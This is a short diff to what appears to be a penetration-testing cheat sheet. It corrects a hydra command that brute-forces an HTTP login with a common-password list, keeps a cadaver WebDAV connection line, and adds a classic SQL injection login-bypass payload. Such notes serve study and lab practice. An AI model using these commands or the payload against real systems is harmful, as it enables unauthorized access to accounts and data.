@@ -213,7 +213,7 @@ Finding password knowing username:
 
 $SERVICE --> ssh, ftp...
 
-hydra -l bob -P 1000_common_passwords.txt -s 8080 http-get /protected
+hydra -l bob -P 1000_common_passwords.txt  $IP -s 8080 http-get /protected
 
 bruteforces site directly
 
@@ -623,3 +623,11 @@ xampp --> default pass
 cadaver http://10.10.0.1/webdav
 
 --> connect to webdav
+
+<br />
+<br />
+
+Popular SQL injection payload
+
+admin' or '1'='1'#"
+
